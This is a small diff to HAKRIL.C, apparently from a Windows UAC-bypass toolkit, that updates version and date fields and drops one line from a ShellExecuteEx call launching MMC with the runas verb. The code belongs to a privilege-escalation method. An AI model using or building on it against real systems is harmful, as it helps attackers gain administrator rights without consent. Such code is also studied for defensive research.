@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2017
+*  (C) COPYRIGHT AUTHORS, 2017 - 2018
 *
 *  TITLE:       HAKRIL.C
 *
-*  VERSION:     2.85
+*  VERSION:     2.86
 *
-*  DATE:        01 Dec 2017
+*  DATE:        15 Jan 2018
 *
 *  UAC bypass method from Clement Rouault aka hakril.
 *
@@ -195,7 +195,6 @@ BOOL ucmMethodHakril(
         shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
         shinfo.lpFile = MMC_EXE;
         shinfo.lpParameters = g_SnapInParameters;
-        shinfo.lpDirectory = NULL;
         shinfo.lpVerb = RUNAS_VERB;
         shinfo.nShow = SW_SHOW;
         bResult = ShellExecuteEx(&shinfo);
